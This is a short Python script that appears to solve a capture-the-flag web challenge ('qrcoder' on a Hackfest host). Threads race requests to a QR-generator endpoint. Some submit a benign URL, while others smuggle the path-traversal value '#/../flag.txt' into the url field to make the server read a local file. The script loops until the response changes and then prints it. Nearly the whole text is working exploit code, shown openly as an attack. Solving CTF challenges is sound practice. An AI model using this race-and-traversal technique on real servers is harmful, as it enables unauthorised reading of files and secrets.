import requests
import threading

HOST = "qrcoder.challenges.hackfest.tn:8000"
SESSION = requests.get(f"http://{HOST}/qr_generator?").cookies["session"]

def get_flag(for_race=False):
	if not for_race:
		while True:
			result = requests.post(f"http://{HOST}/qr_generator",
					data = {
						'url': 'http://github.com'
					},
					cookies = {
						'session': SESSION
					})
			if not "ORw0KGgoAAAANSUhEUgAAAUoAAAFKAQAAAABTUiuoAAAB/klEQVR4nO2bQYqkQBBFX0wKvUyhDtBHSa/WN9Oj1AEKzKWQ8mdhlmUzMFgDjg4TsRBL3+JDEJk/IywTO2P4sZcERx111FFHHT0StRrN8tC6bLZczMysO1yAo++gSZI01rzpqw0CgiRJ39FjBDj6DprXEiLIujgZAK96u5BWRzcxG2k8U4Cje1FprIvgSQIc/U0817koIANDh71eb3N2ulZHa7aGJUMBS+OtGPlWgNm26OlaHV2ytSmhoQ2IPFutt6MFOPr+easDIDeQRrAuSvqyBgYz+4YeI8DRXbH687mBOBnD52QM7aMR8eEr4bVQlgNwD5DG6gSXn8tdLPXs3J+u1dGltgxAUBC5BeKjEflWj" in result.text:
				print(result.text)
				break
		exit()
	else:
		while True:
			requests.post(f"http://{HOST}/qr_generator",
						data = {
							'url': '#/../flag.txt'
						},
						cookies = {
							'session': SESSION
						})
if __name__ == "__main__":
	threads = []
	for i in range(3):
		threads.append(threading.Thread(target=get_flag, daemon=True))
		threads.append(threading.Thread(target=get_flag, args=(True, ), daemon=True))

	for t in threads:
		t.start()

	for t in threads:
		t.join()

	print("done!")